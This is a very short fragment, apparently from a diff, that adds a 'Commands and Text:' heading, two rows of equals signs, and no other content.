+Commands and Text:
+============================================================================================
+============================================================================================
+
